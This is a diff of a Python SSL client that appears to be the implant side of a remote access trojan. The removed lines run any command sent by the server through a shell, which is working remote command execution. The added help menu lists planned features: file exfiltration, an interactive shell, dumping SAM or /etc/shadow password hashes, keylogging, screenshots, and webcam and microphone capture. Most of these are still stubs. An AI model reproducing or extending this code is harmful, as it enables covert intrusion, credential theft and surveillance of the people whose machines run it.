@@ -1,7 +1,8 @@
 import socket
 import ssl
 from utils.logger import setup_logger
-import subprocess
+
+# import subprocess
 
 logger = setup_logger()
 
@@ -53,18 +54,31 @@ class SSLClient:
             return None
 
     def execute_command(self, command: str) -> str:
-        if command == "ping":
-            return "pong"
-
-        if command == "hello":
-            return "hello from client"
-
-        try:
-            output = subprocess.check_output(
-                command, shell=True, stderr=subprocess.STDOUT
-            )
-
-            return output.decode()
-
-        except Exception as e:
-            return f"Error: {e}"
+        if command == "help":
+            command_list = [
+                "help: Prints all the possible commands\n",
+                "downloads: Gather client files and send them to server\n",
+                "upload: Gather files from server and send them to client\n",
+                "shell: Opens an interactive shell/bash/cmd\n",
+                "ipconfig: Get the client's network configuration\n",
+                "screenshsot: Take a screenshot of the client\n",
+                "search: Search for a file on the client's filesystem\n",
+                "hashdump: Get the SAM or /etc/shadow file based on the OS\n",
+                "keylogger: Log every key of the client\n",
+                "webcam_snapshot: Take a picture using the client's webcam\n",
+                "webcam_stream: Livestream the client's webcam\n",
+                "record_audio: record's the client audio\n",
+            ]
+            return "".join(command_list)
+        if command == "download":
+            print("Downloading...")
+            return "Downloading..."
+        else:
+            command_not_implemented = [
+                "This ",
+                "command ",
+                "is ",
+                "not ",
+                "implemented",
+            ]
+            return "".join(command_not_implemented)
